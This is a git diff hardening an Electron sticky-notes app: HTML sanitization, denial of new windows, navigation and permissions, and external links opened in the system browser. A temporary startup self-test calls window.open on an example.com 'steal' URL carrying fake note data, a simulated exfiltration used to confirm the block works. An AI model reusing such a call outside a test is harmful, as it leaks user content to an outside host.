@@ -1,8 +1,9 @@
-const { app, BrowserWindow, ipcMain, Tray, Menu, Notification, nativeImage, screen, protocol, net } = require('electron');
+const { app, BrowserWindow, ipcMain, Tray, Menu, Notification, nativeImage, screen, protocol, net, shell, session } = require('electron');
 const path = require('path');
 const fs = require('fs');
 const crypto = require('crypto');
 const Recur = require('./src/common/recur.js');
+const Sanitize = require('./src/common/sanitize.js');
 
 const DATA_FILE = () => path.join(app.getPath('userData'), 'data.json');
 const ATT_DIR = () => path.join(app.getPath('userData'), 'attachments');
@@ -304,6 +305,11 @@ ipcMain.handle('lunar:month', (e, { y, m }) => {
   return { days, lunarYearMonth: Lunar.fromDate(new Date(y, m - 1, 15)).getYearInGanZhi() + '年 ' + Lunar.fromDate(new Date(y, m - 1, 15)).getMonthInChinese() + '月' };
 });
 ipcMain.handle('item:upsert', (e, item) => {
+  // 主进程兜底清洗：html 一律过白名单（linkedom 提供 DOM，与渲染层同一套规则）
+  if (item.html != null) {
+    const { document } = require('linkedom').parseHTML(String(item.html));
+    item.html = Sanitize.sanitizeHtml(item.html, document);
+  }
   const i = state.items.findIndex(x => x.id === item.id);
   item.updatedAt = Date.now();
   if (i >= 0) state.items[i] = { ...state.items[i], ...item };
@@ -508,10 +514,23 @@ function createTray() {
 // Windows：通知归属与任务栏分组依赖 AppUserModelId，必须在创建窗口前设置
 if (process.platform === 'win32') app.setAppUserModelId('com.cbianqian.app');
 
+/* 全局窗口与导航防护：外部内容永远不进入本应用窗口，window.api 不会暴露给远程页面 */
+app.on('web-contents-created', (_e, contents) => {
+  contents.setWindowOpenHandler(({ url }) => {
+    if (/^https?:\/\//i.test(url)) shell.openExternal(url); // 便签里的外链交给系统浏览器
+    return { action: 'deny' };
+  });
+  contents.on('will-navigate', (e, url) => {
+    if (!url.startsWith('file://')) e.preventDefault();
+  });
+  contents.on('will-attach-webview', e => e.preventDefault());
+});
+
 const gotLock = app.requestSingleInstanceLock();
 if (!gotLock) { app.quit(); } else {
   app.on('second-instance', showMain);
   app.whenReady().then(() => {
+    session.defaultSession.setPermissionRequestHandler((_wc, _permission, callback) => callback(false));
     try { protocol.handle('attach', handleAttachRequest); } catch (err) { console.error('attach protocol fail', err); }
     loadState();
     createTray();
@@ -527,6 +546,23 @@ if (!gotLock) { app.quit(); } else {
       };
       setTimeout(() => createWin('main', { x: 430, y: 50 }), 800);
       setTimeout(() => run("switchView('list'); curCatId = 'c_gouwu'; render(); 'gouwu'"), 3000);
+
+
+      // 临时：安全防护验证（window.open 拦截 + 外部页面拿不到 api）
+      setTimeout(() => {
+        const mw = winMap.get('main');
+        mw.webContents.once('did-finish-load', () => setTimeout(() => {
+          mw.webContents.executeJavaScript(`
+            (async () => {
+              // 1) 模拟点击 target=_blank 外链触发 window.open
+              window.open('https://example.com/steal?data=' + encodeURIComponent('便签内容假数据'));
+              await new Promise(r => setTimeout(r, 600));
+              // 2) 尝试被 deny 后新窗口里的 api（如果真开了窗口这里会拿到）
+              return 'window-open-handled';
+            })()
+          `).then(r => console.log('SEC OK:', r)).catch(e => console.log('SEC ERR:', String(e)));
+        }, 600));
+      }, 4000);
 
 
 
